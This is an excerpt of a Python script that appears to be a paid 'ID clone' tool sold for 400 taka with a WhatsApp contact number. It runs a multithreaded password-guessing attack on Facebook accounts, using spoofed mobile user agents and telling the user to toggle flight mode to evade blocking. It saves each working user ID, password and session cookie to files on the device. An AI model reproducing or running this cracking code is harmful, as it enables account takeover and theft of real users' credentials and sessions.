...
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m\x1b[1;92m Version    ● \033[1;32m0.1\033[1;32m
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m\x1b[1;92m 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿   ● +8801608032030
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'{G1}[{A}0{G1}]{G1} FF ID CLONE =400  ')
    print(f'{G1}[{A}0{G1}]{G1} FACEBOOK ID CLONE = 400 ')
    print(f'{G1}[{A}0{G1}]{G1} FREE FIRE CHOICE CLONE =400 ')
    print(f'{G1}[{A}0{G1}]{G1} 𝙴𝚇𝙸𝚃 𝚃𝙾𝙾𝙻 ')
    linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} THIS TOOLS PAID =400 TAKA {A}●{G1} ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        XXX()
...
def XXX():
    ...
    sex = input(f'{G1}[{A}?{G1}]{G1} 𝙲𝙷𝙾𝙸𝙲𝙴 {A}●{G1} ')
    if sex in ['1']:
        bd()
    elif sex in ['2']:
        India()
...
def bd():
    ...
    code = input(f'{G1}[{A}?{G1}]{G1} 𝙲𝙷𝙾𝙸𝙲𝙴  {A}●{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}●{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} 𝙲𝙷𝙾𝙸𝙲𝙴  {A}●{G1} '))
...
def file():
    clear()
    print(f'{G1}[{A}●{G1}]{G1} EXAMPLE {A}●{G1} /{A}sdcard{G1}/{A}atik.txt');linex()
    ...
    with ThreadPool(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f'{G1}[{A}●{G1}]{G1} 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳𝚂{A}●{G1} {tl}')
        print(f"{G1}[{A}●{G1}]{G1} 𝙿𝙻𝙴𝙰𝚂𝙴 {G1}[{A}𝙾𝙽{G1}/{A}𝙾𝙵{G1}] 𝙴𝚅𝙴𝚁𝚈 5 𝙼𝙸𝙽 {A}3{G1} 𝚈𝙾𝚄𝚁 𝙵𝙻𝙸𝙶𝙷𝚃 𝙼𝙾𝙳𝙴");linex()
        for user in fo:
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}𝚇𝙲-𝙼1{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            head={'User-Agent': "[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Airtel;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}𝚇𝙲-𝙼1-💚{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/SWAG-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}𝚇𝙲-𝙼1-🥹{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}𝚇𝙲-𝙼1-💚{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/SWAG-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}𝚇𝙲-𝙼1-🥹{A}]{M} {ids} {A}|{M} {pas}')
